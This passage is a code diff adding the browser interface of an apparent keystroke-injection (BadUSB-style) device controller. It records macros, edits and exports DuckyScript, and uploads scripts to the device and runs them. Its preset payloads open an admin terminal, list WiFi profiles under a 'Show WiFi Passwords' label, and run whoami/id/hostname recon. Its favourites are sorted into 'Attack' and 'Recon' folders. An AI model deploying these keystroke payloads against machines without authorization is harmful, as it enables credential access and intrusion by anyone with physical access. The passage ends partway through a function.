+  if (recActiveMods.gui) mods.push('GUI');
+
+  let finalAction = '';
+  if (mods.length > 0) {
+    const mainKey = (processedKey.length === 1 ? processedKey : processedKey.toUpperCase());
+    finalAction = mods.join(' ') + ' ' + mainKey;
+    // Reset modifiers after combo emission
+    recActiveMods = { shift: false, ctrl: false, alt: false, gui: false };
+    updateRecModVisuals();
+  } else {
+    finalAction = processedKey;
+  }
+
+  // Single character shift auto-reverts to lowercase
+  if (recCapsState === 1 && keyStr.length === 1) {
+    recCapsState = 0;
+    recActiveMods.shift = false;
+    updateRecKeyCasing();
+    updateRecModVisuals();
+  }
+
+  macroEvents.push({
+    key: finalAction,
+    delay: delay,
+    time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })
+  });
+
+  renderMacroStream();
+}
+
+function updateRecModVisuals() {
+  const panel = $('tool-recorder');
+  if (!panel) return;
+  ['shift', 'ctrl', 'alt', 'gui'].forEach(m => {
+    panel.querySelectorAll(`.kb-key.mod`).forEach(btn => {
+      if (btn.textContent.toLowerCase().includes(m)) {
+        btn.classList.toggle('active', recActiveMods[m]);
+      }
+    });
+  });
+}
+
+function startMacroRecord() {
+  window.removeEventListener('keydown', captureMacroKey);
+  isRecordingMacro = true;
+  macroEvents = [];
+  macroLastTime = Date.now();
+  $('recStartBtn').disabled = true;
+  $('recStopBtn').disabled = false;
+  $('recPlayBtn').disabled = true;
+  $('recDot').classList.add('run');
+  $('recStatusLabel').textContent = 'Status: Recording...';
+
+  window.addEventListener('keydown', captureMacroKey);
+  renderMacroStream();
+  toast('Macro recording started 🔴', 'ok');
+}
+
+function stopMacroRecord() {
+  isRecordingMacro = false;
+  window.removeEventListener('keydown', captureMacroKey);
+  $('recStartBtn').disabled = false;
+  $('recStopBtn').disabled = true;
+  $('recPlayBtn').disabled = macroEvents.length === 0;
+  $('recDot').classList.remove('run');
+  $('recStatusLabel').textContent = 'Status: Stopped (' + macroEvents.length + ' events recorded)';
+  toast('Recording stopped ■', 'ok');
+}
+
+function captureMacroKey(e) {
+  if (!isRecordingMacro) return;
+  if (e.repeat) return;
+
+  // Ignore typing inside text inputs / textareas
+  const tag = e.target?.tagName?.toLowerCase();
+  if (tag === 'input' || tag === 'textarea') return;
+
+  // Standalone modifier press - wait for main key
+  if (['Control', 'Shift', 'Alt', 'Meta'].includes(e.key)) {
+    return;
+  }
+
+  const now = Date.now();
+  const delay = Math.min(Math.max(now - macroLastTime, 50), 4000);
+  macroLastTime = now;
+
+  let mods = [];
+  if (e.ctrlKey) mods.push('CTRL');
+  if (e.altKey) mods.push('ALT');
+  if (e.shiftKey) mods.push('SHIFT');
+  if (e.metaKey) mods.push('GUI');
+
+  let keyName = e.key;
+  if (keyName === ' ') keyName = 'SPACE';
+  else if (keyName === 'Enter') keyName = 'ENTER';
+  else if (keyName === 'Backspace') keyName = 'BACKSPACE';
+  else if (keyName === 'Tab') keyName = 'TAB';
+  else if (keyName === 'Escape') keyName = 'ESCAPE';
+
+  let finalAction = '';
+  if (mods.length > 0) {
+    const mainKey = (keyName.length === 1 ? keyName.toLowerCase() : keyName.toUpperCase());
+    finalAction = mods.join(' ') + ' ' + mainKey;
+  } else {
+    finalAction = keyName;
+  }
+
+  macroEvents.push({
+    key: finalAction,
+    delay: delay,
+    time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })
+  });
+
+  renderMacroStream();
+}
+
+function renderMacroStream() {
+  const stream = $('recStream');
+  if (!stream) return;
+  if (macroEvents.length === 0) {
+    stream.innerHTML = '<span style="color:var(--dim2)">// Actions will appear here...</span>';
+    return;
+  }
+  stream.innerHTML = macroEvents.map((ev, i) => `
+    <div style="display:flex;justify-content:space-between;padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.02)">
+      <span><span style="color:var(--dim2)">[${ev.delay}ms]</span> <b style="color:var(--g)">${escHtml(ev.key)}</b></span>
+      <span style="color:var(--dim2);font-size:0.65rem">#${i + 1}</span>
+    </div>
+  `).join('');
+  stream.scrollTop = stream.scrollHeight;
+}
+
+async function playMacroRecord() {
+  if (macroEvents.length === 0) return;
+  toast('Replaying recorded macro payload...', 'ok', 2000);
+  let idx = 0;
+
+  async function step() {
+    if (idx >= macroEvents.length) {
+      toast('Macro playback completed ✓', 'ok', 2000);
+      return;
+    }
+    const ev = macroEvents[idx++];
+    toast(`Executing: ${ev.key}`, 'ok', 1000);
+
+    // Execute live HID keystroke command on target device
+    sendHidAction(ev.key);
+
+    const nextDelay = idx < macroEvents.length ? Math.max(macroEvents[idx].delay, 100) : 500;
+    setTimeout(step, Math.min(nextDelay, 3000));
+  }
+
+  step();
+}
+
+function clearMacroRecord() {
+  macroEvents = [];
+  recActiveMods = { shift: false, ctrl: false, alt: false, gui: false };
+  updateRecModVisuals();
+  renderMacroStream();
+  $('recPlayBtn').disabled = true;
+  $('recStatusLabel').textContent = 'Status: Idle';
+  toast('Recorder cleared');
+}
+
+function exportMacroToEditor() {
+  if (macroEvents.length === 0) {
+    toast('No actions recorded to export', 'warn');
+    return;
+  }
+
+  let dsLines = ['REM --- Recorded Macro Payload ---'];
+  let currentString = '';
+
+  macroEvents.forEach(ev => {
+    if (ev.delay > 300) {
+      if (currentString) {
+        dsLines.push('STRING ' + currentString);
+        currentString = '';
+      }
+      dsLines.push('DELAY ' + ev.delay);
+    }
+
+    const isSingleChar = ev.key.length === 1 && !/\s/.test(ev.key);
+
+    if (isSingleChar) {
+      currentString += ev.key;
+    } else {
+      if (currentString) {
+        dsLines.push('STRING ' + currentString);
+        currentString = '';
+      }
+      dsLines.push(ev.key);
+    }
+  });
+
+  if (currentString) {
+    dsLines.push('STRING ' + currentString);
+  }
+
+  const generatedDs = dsLines.join('\n');
+  $('editor').value = generatedDs;
+  updateLines();
+  saveScriptVersion('Recorded Macro Export');
+  localStorage.setItem('gc_script', generatedDs);
+
+  closeAllTools();
+  goPage('scripts', document.querySelectorAll('.nav-item')[0]);
+  toast('Macro exported to DuckyScript Editor ✓', 'ok', 2000);
+}
+
+// Wire up events on editor textarea
+const edArea = $('editor');
+if (edArea) {
+  edArea.addEventListener('input', handleEditorInput);
+  edArea.addEventListener('keydown', handleEditorKeyDown);
+  edArea.addEventListener('click', hideAcDropdown);
+}
+
+// ─── Presets ───
+function togglePresets() {
+  $('presetsDrawer').classList.toggle('open');
+}
+const PRESETS = {
+  'win-run': 'REM Windows Run Dialog\nDELAY 500\nGUI r\nDELAY 500',
+  'win-term': 'REM Windows Terminal Admin\nDELAY 500\nGUI x\nDELAY 400\nSTRING a\nDELAY 600\nLEFTARROW\nENTER',
+  'win-info': 'REM Windows System Info\nDELAY 500\nGUI r\nDELAY 600\nSTRING cmd\nENTER\nDELAY 800\nSTRING systeminfo\nENTER',
+  'win-wifi': 'REM Show WiFi Passwords\nDELAY 500\nGUI r\nDELAY 600\nSTRING cmd\nENTER\nDELAY 900\nSTRING netsh wlan show profiles\nENTER',
+  'mac-spot': 'REM macOS Spotlight\nDELAY 500\nGUI SPACE\nDELAY 400',
+  'mac-term': 'REM macOS Terminal\nDELAY 500\nGUI SPACE\nDELAY 400\nSTRING Terminal\nENTER\nDELAY 800',
+  'lnx-term': 'REM Linux Terminal\nDELAY 500\nCTRL ALT t\nDELAY 800',
+  'lnx-recon': 'REM Linux Recon\nDELAY 500\nCTRL ALT t\nDELAY 900\nSTRING whoami && id && hostname\nENTER',
+};
+function loadPreset(k) {
+  $('editor').value = PRESETS[k] || '';
+  updateLines();
+  localStorage.setItem('gc_script', $('editor').value);
+  toast('Preset loaded', 'ok', 2000);
+  $('presetsDrawer').classList.remove('open');
+}
+
+// ─── File I/O ───
+function openFile(e) {
+  const f = e.target.files[0];
+  if (!f) return;
+  const r = new FileReader();
+  r.onload = ev => {
+    $('editor').value = ev.target.result;
+    updateLines();
+    $('fileName').textContent = f.name;
+    localStorage.setItem('gc_script', $('editor').value);
+    toast('Loaded ' + f.name, 'ok');
+  };
+  r.readAsText(f);
+  e.target.value = '';
+}
+function clearEditor() {
+  const ed = $('editor');
+  if (ed) {
+    ed.value = '';
+    ed.dispatchEvent(new Event('input'));
+  }
+  updateLines();
+  if (typeof liveCompile === 'function') liveCompile();
+  $('fileName').textContent = 'untitled.txt';
+  localStorage.removeItem('gc_script');
+  clearEditorEditMode();
+  if (typeof acDismissAiSuggestion === 'function') acDismissAiSuggestion();
+  const acDrop = $('acDropdown');
+  if (acDrop) acDrop.style.display = 'none';
+  toast('Editor cleared');
+}
+
+// ═══════════════════════════════════════════════════
+//  ⭐ FAVOURITES
+// ═══════════════════════════════════════════════════
+
+var favSelectedTag = 'custom';
+var favCurrentFilter = 'all';
+
+async function fetchFolderList(path) {
+  const url = getProxyUrl(fmBase() + '/fm/list?path=' + encodeURIComponent(path));
+  try {
+    const r = await fetch(url, { headers: { 'Accept': '*/*', 'Referer': fmBase() + '/file-manager' } });
+    const text = await r.text();
+    try { return JSON.parse(text); } catch { return []; }
+  } catch (e) {
+    // XHR fallback
+    return await new Promise((res) => {
+      const xhr = new XMLHttpRequest();
+      xhr.open('GET', url, true);
+      xhr.setRequestHeader('Accept', '*/*');
+      xhr.onload = () => { try { res(JSON.parse(xhr.responseText)); } catch { res([]); } };
+      xhr.onerror = () => res([]);
+      xhr.timeout = 5000; xhr.ontimeout = () => res([]);
+      xhr.send();
+    });
+  }
+}
+
+async function loadFavsFromDeviceDirectories(filter = 'all') {
+  let categories = [];
+  if (filter === 'all') {
+    categories = ['Attack', 'Recon', 'Utility', 'Custom'];
+  } else {
+    categories = [filter.charAt(0).toUpperCase() + filter.slice(1)];
+  }
+  let allFavs = [];
+  const promises = categories.map(async (cat) => {
+    const path = '/' + cat;
+    try {
+      const r = await fmFetch('/fm/list?path=' + encodeURIComponent(path));
+      const text = await r.text();
+      let items = [];
+      try { items = JSON.parse(text); } catch { items = []; }
+      const files = Array.isArray(items) ? items : (items.files || items.entries || []);
+      files.forEach(item => {
+        const isDir = item.dir === true || item.type === 'dir' || item.isDir || item.directory;
+        if (!isDir) {
+          const name = item.name || item.filename || '';
+          allFavs.push({
+            id: cat + '-' + name,
+            tag: cat.toLowerCase(),
+            saved: 'Device File',
+            devicePath: path + '/' + name
+          });
+        }
+      });
+    } catch (e) {
+      console.warn('Could not load folder', path, e);
+    }
+  });
+  await Promise.all(promises);
+  return allFavs;
+}
+
+// ─── Drawer toggle ───
+function toggleFavs() {
+  const drawer = $('favsDrawer');
+  const isOpen = drawer.classList.contains('open');
+  // Close presets when opening favs
+  if (!isOpen) $('presetsDrawer').classList.remove('open');
+  drawer.classList.toggle('open');
+  renderFavGrid();
+}
+
+// ─── Modal: open ───
+function showAddFavModal() {
+  const script = $('editor').value.trim();
+  if (!script) { toast('Editor is empty — nothing to star', 'warn'); return; }
+
+  const lines = script.split('\n').length;
+  $('favModalSub').textContent = lines + ' line' + (lines !== 1 ? 's' : '');
+  // Auto-suggest name from first REM line
+  const rem = script.match(/^REM (.+)/m);
+  $('favName').value = rem ? rem[1].trim().slice(0, 40) : '';
+
+  $('addFavModal').style.display = 'flex';
+  $('favSavePrompt').style.display = 'none';
+  $('favMainForm').style.display = 'block';
+
+  // Reset tag to custom and select it (which updates the preview)
+  selectFavTag('custom', document.querySelector('.fav-tag-opt.custom'));
+
+  setTimeout(() => $('favName') && $('favName').focus(), 100);
+}
+
+// Live path preview helper
+function updateFavPathPreview() {
+  const name = ($('favName') ? $('favName').value : '').trim();
+  const catName = favSelectedTag.charAt(0).toUpperCase() + favSelectedTag.slice(1);
+  const folder = '/' + catName;
+  let safeName = name.replace(/[^a-zA-Z0-9_\-\. ]/g, '');
+  if (!safeName) safeName = 'script';
+  if (!safeName.match(/\.[a-zA-Z0-9]+$/)) {
+    safeName += '.txt';
+  }
+  const fullPath = folder + '/' + safeName;
+  const pathEl = $('favLinkedPath');
+  const pathTextEl = $('favLinkedPathText');
+  if (pathEl && pathTextEl) {
+    pathTextEl.textContent = 'Saving to: ' + fullPath;
+    pathEl.style.display = 'flex';
+  }
+}
+
+function hideAddFavModal() {
+  $('addFavModal').style.display = 'none';
+  window._pendingFavScript = null;
+  window._pendingFavDevicePath = null;
+}
+
+function selectFavTag(tag, btn) {
+  favSelectedTag = tag;
+  document.querySelectorAll('.fav-tag-opt').forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+  updateFavPathPreview();
+}
+
+// ─── Modal: confirm save ───
+async function confirmAddFav() {
+  const name = $('favName').value.trim();
+  if (!name) { toast('Enter a name for this favourite', 'warn'); return; }
+  const script = ($('editor').value).trim();
+  if (!script) { toast('No script content to save', 'warn'); return; }
+
+  const btn = $('addFavConfirmBtn');
+  const oldText = btn.innerHTML;
+  btn.innerHTML = '<span class="spin"></span> Saving…';
+  btn.disabled = true;
+
+  const catName = favSelectedTag.charAt(0).toUpperCase() + favSelectedTag.slice(1);
+  const folder = '/' + catName;
+  let safeName = name.replace(/[^a-zA-Z0-9_\-\. ]/g, '');
+  if (!safeName) safeName = 'script';
+  if (!safeName.match(/\.[a-zA-Z0-9]+$/)) {
+    safeName += '.txt';
+  }
+  const fullPath = folder + '/' + safeName;
+
+  try {
+    // Try to create the category folder on the device first
+    try {
+      await fmFetchPost('/fm/mkdir?path=' + encodeURIComponent(folder));
+    } catch (err) {
+      console.log('[GhostChip] Folder creation complete or handled:', folder, err);
+    }
+
+    const uploadUrl = fmBase() + '/fm/upload?path=' + encodeURIComponent(folder);
+    const crossOrigin = new URL(uploadUrl).origin !== location.origin;
+    const blob = new Blob([script], { type: 'text/plain' });
+    const file = new File([blob], safeName, { type: 'text/plain' });
+    const fd = new FormData();
+    fd.append('file', file, safeName);
+    const opts = crossOrigin
+      ? { method: 'POST', mode: 'no-cors', body: fd }
+      : { method: 'POST', headers: { 'Accept': '*/*' }, body: fd };
+
+    await fetch(uploadUrl, opts);
+
+    // Set editor edit mode for the saved path
+    fmEditingPath = fullPath;
+    setEditorEditMode(safeName, fullPath);
+    $('fileName').textContent = safeName;
+    localStorage.setItem('gc_script', script);
+
+    // Animate star button
+    const star = $('starBtn');
+    if (star) {
+      star.classList.add('starred');
+      setTimeout(() => star.classList.remove('starred'), 1200);
+    }
+
+    hideAddFavModal();
+    toast('⭐ Saved to favourites & uploaded to ' + fullPath + ' ✓');
+
+    // If drawer is open, re-render
+    if ($('favsDrawer').classList.contains('open')) renderFavGrid();
+  } catch (e) {
+    toast('Save sent — verify in File Manager', 'warn', 4000);
+    hideAddFavModal();
+  } finally {
+    btn.innerHTML = oldText;
+    btn.disabled = false;
+  }
+}
+
+
+// ─── Render the grid ───
+const TAG_META = {
+  attack: { emoji: '<svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="22" y1="12" x2="18" y2="12"/><line x1="6" y1="12" x2="2" y2="12"/><line x1="12" y1="6" x2="12" y2="2"/><line x1="12" y1="22" x2="12" y2="18"/></svg>', label: 'Attack', cls: 'tag-attack' },
+  recon: { emoji: '<svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><path d="M4.9 19.1C1.9 16.1 1.9 11.4 4.9 8.4"/><path d="M7.8 16.2c-1.6-1.6-1.6-4.1 0-5.7"/><circle cx="12" cy="12" r="2"/></svg>', label: 'Recon', cls: 'tag-recon' },
+  utility: { emoji: '<svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>', label: 'Utility', cls: 'tag-utility' },
+  custom: { emoji: '<svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>', label: 'Custom', cls: 'tag-custom' },
+};
+
+async function renderFavGrid() {
+  const grid = $('favGrid');
+  if (!grid) return;
+
+  grid.innerHTML = '<div class="fav-empty"><span class="spin"></span> Loading...</div>';
+
+  const list = await loadFavsFromDeviceDirectories(favCurrentFilter);
+
+  if (!list.length) {
+    grid.innerHTML = '<div class="fav-empty">' +
+      (favCurrentFilter === 'all' ? 'No favourites yet on device.' : 'No ' + favCurrentFilter + ' favourites yet.') +
+      '</div>';
+    return;
+  }
+
+  grid.innerHTML = list.map(fav => {
+    const m = TAG_META[fav.tag] || TAG_META.custom;
+    const fileName = fav.devicePath ? fav.devicePath.split('/').pop() : (fav.name || 'script.txt');
+    const pathHtml = fav.devicePath
+      ? `<div class="fav-device-path" title="${escHtml(fav.devicePath)}"><svg viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg><span class="fav-path-text">${escHtml(fav.devicePath)}</span></div>`
+      : '';
+    const metaText = `Device File`;
+    return `<div class="fav-card ${m.cls} pro-ai-card" id="fav-${fav.id}" style="padding:14px; display:flex; flex-direction:column; gap:10px; background:var(--s2); border:1px solid rgba(255,170,0,0.25); border-radius:12px;">
+      <div class="fav-card-top" style="display:flex; justify-content:space-between; align-items:center;">
+        <span class="fav-tag-badge ${m.cls}" style="display:flex; align-items:center; gap:5px; font-size:0.68rem; font-weight:700;">${m.emoji} <span>${m.label.toUpperCase()}</span></span>
+      </div>
+      <div class="fav-card-name" onclick="runFavDirectly('${fav.id}')" style="cursor:pointer; font-weight:700; font-size:0.95rem; color:var(--white); font-family:var(--mono);">${escHtml(fileName)}</div>
+      <div class="fav-card-meta" style="font-family:var(--mono); font-size:0.7rem; color:var(--dim);">${metaText}</div>
+      ${pathHtml}
+      <div style="display:flex; gap:6px; margin-top:auto;">
+        <button class="btn btn-primary" onclick="event.stopPropagation();runFavDirectly('${fav.id}')" style="flex:1; padding:8px 12px; font-size:0.75rem; background: linear-gradient(135deg, #ffaa00, #ff8800); color:#000; display:flex; align-items:center; justify-content:center; gap:6px;" title="Execute directly from memory card">
+          <svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+          <span>Run Payload</span>
+        </button>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+// ─── Filter ───
+function filterFavs(tag, btn) {
+  favCurrentFilter = tag;
+  document.querySelectorAll('.fav-filter-btn').forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+  renderFavGrid();
+}
+
+// ─── Run fav directly from device memory card ───
+async function runFavDirectly(id) {
+  const list = await loadFavsFromDeviceDirectories();
+  const fav = list.find(f => f.id === id);
+  if (!fav || !fav.devicePath) return;
+  const fileName = fav.devicePath.split('/').pop();
+  toast('Running ' + fileName + '…', 'warn', 3000);
+  try {
+    await fmFetchPost('/fm/run?path=' + encodeURIComponent(fav.devicePath));
+    toast('Script running: ' + fileName + ' ✓');
+  } catch (e) {
+    toast('Run sent. Check device status.', 'warn');
+  }
+}
+
+// ─── Sync fav content from device ───
+function favsLoad() {
+  return [];
+}
+function favsSave() { }
+function exportFavs() { }
+function importFavs() { }
+function favTouchStart() { }
+function favTouchEnd() { }
+
+// ─── Init: render on load ───
+(function () {
+  function initFavs() {
+    renderFavGrid();
+  }
+  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initFavs);
+  else initFavs();
+})();
+
+
+var saveCurrentBrowsePath = '/';
+var saveChosenFolder = '/';
+
+function showSaveModal() {
+  const script = $('editor').value.trim();
+  if (!script) { toast('Editor is empty — nothing to save', 'warn'); return; }
+  // If currently editing a device file, offer a quick save-back
+  if (fmEditingPath) {
+    fmSaveEditBack();
+    return;
+  }
+  // Pre-fill filename from current file name in editor bar
+  const currentName = $('fileName').textContent || 'untitled.txt';
+  const baseName = currentName.endsWith('.txt') ? currentName : currentName.replace(/\.[^.]+$/, '') + '.txt';
+  $('saveFileName').value = baseName === 'untitled.txt' ? '' : baseName;
+  saveCurrentBrowsePath = '/';
+  saveChosenFolder = '/';
+  $('saveSelectedPath').textContent = '/';
+  updateSavePathPreview();
+  $('saveModal').style.display = 'flex';
+  saveFolderLoad('/');
+  setTimeout(() => $('saveFileName') && $('saveFileName').focus(), 300);
+}
+
+function hideSaveModal() {
+  $('saveModal').style.display = 'none';
+}
+
+function updateSavePathPreview() {
+  let folder = saveChosenFolder || '/';
+  let name = ($('saveFileName') ? $('saveFileName').value : '').trim();
+  if (!name) name = 'script';
+  if (!name.match(/\.[a-zA-Z0-9]+$/)) name += '.txt';
+  const full = (folder === '/' ? '' : folder) + '/' + name;
+  if ($('savePathPreview')) $('savePathPreview').textContent = full;
+}
+
+// Wire up live preview updates on filename input
+(function () {
+  function setupSavePreviews() {
+    const fn = $('saveFileName');
+    if (fn) fn.addEventListener('input', updateSavePathPreview);
+  }
+  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', setupSavePreviews);
+  else setupSavePreviews();
+})();
+
+async function saveFolderLoad(path) {
+  saveCurrentBrowsePath = path;
+  const list = $('saveFolderList');
+  if (!list) return;
+
+  // Render loading state
+  list.innerHTML = '<div class="save-folder-loading"><div class="save-spinner"></div><span>Loading…</span></div>';
+
+  // Update breadcrumb
+  const parts = path.split('/').filter(Boolean);
+  let crumbHtml = '<span class="save-crumb' + (path === '/' ? ' active' : '') + '" onclick="saveFolderSelect(\'/\');saveFolderLoad(\'/\')">⌂ root</span>';
+  let built = '';
+  parts.forEach((p, i) => {
+    built += '/' + p;
+    const isLast = i === parts.length - 1;
+    const sp = built.replace(/'/g, "\\'");
+    crumbHtml += '<span class="save-crumb-sep">›</span><span class="save-crumb' + (isLast ? ' active' : '') + '" onclick="saveFolderSelect(\'' + sp + '\');saveFolderLoad(\'' + sp + '\')">' + escHtml(p) + '</span>';
+  });
+  const bc = $('saveBreadcrumb');
+  if (bc) bc.innerHTML = crumbHtml;
+
+  // Select this folder immediately when navigating
+  saveFolderSelect(path);
+
+  try {
+    const url = getProxyUrl(fmBase() + '/fm/list?path=' + encodeURIComponent(path));
+    let data;
+    try {
+      const r = await fetch(url, { headers: { 'Accept': '*/*' } });
+      const text = await r.text();
+      try { data = JSON.parse(text); } catch { data = []; }
+    } catch {
+      // XHR fallback
+      data = await new Promise((res, rej) => {
+        const xhr = new XMLHttpRequest();
+        xhr.open('GET', url, true);
+        xhr.setRequestHeader('Accept', '*/*');
+        xhr.onload = () => { try { res(JSON.parse(xhr.responseText)); } catch { res([]); } };
+        xhr.onerror = () => rej(new Error('Network error'));
+        xhr.timeout = 8000; xhr.ontimeout = () => rej(new Error('Timeout'));
+        xhr.send();
+      });
+    }
+
+    const items = Array.isArray(data) ? data : (data.files || data.entries || []);
+    // Filter only directories
+    const dirs = items.filter(i => i.dir === true || i.type === 'dir' || i.isDir || i.directory);
+    dirs.sort((a, b) => (a.name || '').localeCompare(b.name || ''));
+
+    if (!dirs.length) {
+      list.innerHTML = '<div class="save-folder-empty">No subfolders here.<br><span style="opacity:.6;font-size:.68rem">Files will be saved in the selected folder above.</span></div>';
+      return;
+    }
+
+    list.innerHTML = dirs.map(item => {
+      const name = item.name || item.filename || '';
+      const iPath = (path === '/' ? '' : path) + '/' + name;
+      const sp = iPath.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+      return '<div class="save-folder-item" onclick="saveFolderSelect(\'' + sp + '\');saveFolderLoad(\'' + sp + '\')">' +
+        '<svg class="save-folder-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>' +
+        '<span class="save-folder-name">' + escHtml(name) + '</span>' +
+        '<svg class="save-folder-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>' +
+        '</div>';
+    }).join('');
+  } catch (e) {
+    list.innerHTML = '<div class="save-folder-empty" style="color:var(--red)">Failed to load — check connection</div>';
+  }
+}
+
+function saveFolderSelect(path) {
+  saveChosenFolder = path;
+  const selEl = $('saveSelectedPath');
+  if (selEl) selEl.textContent = path;
+  // Highlight selected
+  document.querySelectorAll('.save-folder-item').forEach(el => el.classList.remove('save-folder-sel'));
+  updateSavePathPreview();
+}
+
+async function confirmSaveToDevice() {
+  const script = $('editor').value.trim();
+  if (!script) { toast('Editor is empty', 'warn'); return; }
+
+  const folder = saveChosenFolder || '/';
+  let name = ($('saveFileName') ? $('saveFileName').value : '').trim();
+  if (!name) name = 'script';
+  if (!name.match(/\.[a-zA-Z0-9]+$/)) name += '.txt';
+
+  const btn = $('saveConfirmBtn');
+  btn.innerHTML = '<span class="spin"></span> Saving…';
+  btn.disabled = true;
+
+  try {
+    const uploadUrl = fmBase() + '/fm/upload?path=' + encodeURIComponent(folder);
+    const crossOrigin = new URL(uploadUrl).origin !== location.origin;
+    const blob = new Blob([script], { type: 'text/plain' });
+    const file = new File([blob], name, { type: 'text/plain' });
+    const fd = new FormData();
+    fd.append('file', file, name);
+    const opts = crossOrigin
+      ? { method: 'POST', mode: 'no-cors', body: fd }
+      : { method: 'POST', headers: { 'Accept': '*/*' }, body: fd };
+    await fetch(uploadUrl, opts);
+    $('fileName').textContent = name;
+    const savedPath = (folder === '/' ? '' : folder) + '/' + name;
+    // Set edit mode so future SAVE goes back to this path
+    fmEditingPath = savedPath;
+    setEditorEditMode(name, savedPath);
+    toast('Saved → ' + savedPath + ' ✓');
+    hideSaveModal();
+    // If the user was trying to star — re-open fav modal now with path linked
+    if (window._afterSaveOpenFav) {
+      window._afterSaveOpenFav = false;
+      window._pendingFavDevicePath = savedPath;
+      setTimeout(() => {
+        $('addFavModal').style.display = 'flex';
+        showFavForm(savedPath);
+      }, 400);
+    }
+  } catch (e) {
+    toast('Save sent — verify in File Manager', 'warn', 4000);
+    hideSaveModal();
+  } finally {
+    btn.innerHTML = '💾 Save Here';
+    btn.disabled = false;
+  }
+}
+
+
+
+// ─── Terminal ───
+function termWrite(msg, cls = 't-dim') {
+  const t = $('terminal');
+  if (t.querySelector('.t-dim:only-child')) t.innerHTML = '';
+  const s = document.createElement('span');
+  s.className = cls;
+  s.textContent = msg;
+  t.appendChild(s);
+  t.appendChild(document.createElement('br'));
+  t.scrollTop = t.scrollHeight;
+}
+function clearTerm() {
+  $('terminal').innerHTML = '<span class="t-dim">// output appears here...</span>';
+}
+
+// ─── Execute Script ───
+function terminalReset() {
+  $('terminal').innerHTML = '<div><span class="t-dim">Terminal initialized...</span></div>';
+  lastLogLen = 0;
+}
+
+async function runScript() {
+  const script = $('editor').value.trim();
+  if (!script) { toast('No script to execute', 'warn'); return; }
+  saveScriptVersion('Before execution');
+  if (isRunning) return;
+  isRunning = true;
+  const btn = $('runBtn');
+  btn.classList.add('running');
+  btn.innerHTML = '<span class="spin"></span> EXECUTING...';
+  $('execDot').className = 'exec-dot run';
+  $('execLabel').textContent = 'Executing...';
+  clearTerm();
+  lastLogLen = 0;
+  termWrite('[' + new Date().toLocaleTimeString() + '] Sending payload...', 't-start');
+
+  try {
+    await deviceFetch('/', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'duckyscript=' + encodeURIComponent(script)
+    });
+    termWrite('Payload delivered ✓', 't-ok');
+    toast('Script executed ✓');
+    $('connDot').className = 'conn-dot on';
+  } catch (e) {
+    termWrite('Payload sent (opaque)', 't-ok');
+    toast('Script sent ✓');
+    $('connDot').className = 'conn-dot on';
+  }
+
+  // Try polling for live status
+  if (execPoll) clearInterval(execPoll);
+  execPoll = setInterval(pollExec, 500);
+  setTimeout(finishExec, 5000);
+}
+
+function pollExec() {
+  deviceGet('/execstatus').then(d => {
+    if (d.log && d.log.length > lastLogLen) {
+      for (let i = lastLogLen; i < d.log.length; i++) {
+        let cls = 't-dim';
+        if (d.log[i].startsWith('[START]')) cls = 't-start';
+        else if (d.log[i].startsWith('[DONE]')) cls = 't-ok';
+        else if (d.log[i].includes('REM')) cls = 't-rem';
+        termWrite(d.log[i], cls);
+      }
+      lastLogLen = d.log.length;
+    }
+    if (!d.running) finishExec();
+  }).catch(() => { });
+}
+
+function finishExec() {
+  if (execPoll) { clearInterval(execPoll); execPoll = null; }
+  isRunning = false;
+  $('runBtn').classList.remove('running');
+  $('runBtn').innerHTML = '<span class="btn-icon">▶</span> EXECUTE';
+  $('execDot').className = 'exec-dot ok';
+  $('execLabel').textContent = 'Ready';
+}
+
+// ─── Ping / Connection ───
+async function pingDevice() {
+  toast('Pinging...', 'warn', 1500);
+  try {
+    const c = new AbortController();
+    setTimeout(() => c.abort(), 4000);
+    await deviceFetch('/', { signal: c.signal });
+    $('connDot').className = 'conn-dot on';
+    toast('Device connected ✓');
+  } catch (e) {
+    if (e.name === 'AbortError') {
+      $('connDot').className = 'conn-dot err';
+      toast('Connection timeout', 'err');
+    } else {
+      $('connDot').className = 'conn-dot on';
+      toast('Device connected ✓');
+    }
+  }
+}
+
+function togglePass(id, btn) {
+  const inp = $(id);
+  const show = inp.type === 'password';
+  inp.type = show ? 'text' : 'password';
+  btn.textContent = show ? 'HIDE' : 'SHOW';
+}
+
+// ─── Typing Delay ───
+
+async function saveAutorunScript() {
+  const script = $('editor').value.trim();
+  if (!script) { toast('Editor is empty', 'warn'); return; }
+  toast('Saving Auto-Run...', 'warn');
+  try {
+    // Ensure folder exists
